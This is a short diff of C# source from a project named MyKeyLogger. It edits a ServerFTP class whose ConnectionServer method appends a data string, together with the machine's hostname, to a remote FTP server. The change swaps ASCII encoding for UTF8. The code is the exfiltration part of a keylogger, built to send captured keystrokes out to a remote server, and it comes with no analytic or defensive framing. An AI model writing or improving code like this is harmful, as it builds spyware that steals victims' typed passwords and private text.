@@ -9,6 +9,7 @@ namespace MyKeyLogger
 	{
 		public ServerFTP(){}
 
+		
 		public static void ConnectionServer(string data)
 		{	
 			string hostname = Dns.GetHostName();
@@ -35,7 +36,7 @@ namespace MyKeyLogger
             request.Method = WebRequestMethods.Ftp.AppendFile;
 	       
 			Stream requestStream = request.GetRequestStream();		
-			byte[] buffer = Encoding.ASCII.GetBytes(data);
+			byte[] buffer = Encoding.UTF8.GetBytes(data);
 			request.ContentLength = buffer.Length;				
 			requestStream.Write(buffer, 0, buffer.Length);
 			requestStream.Close();
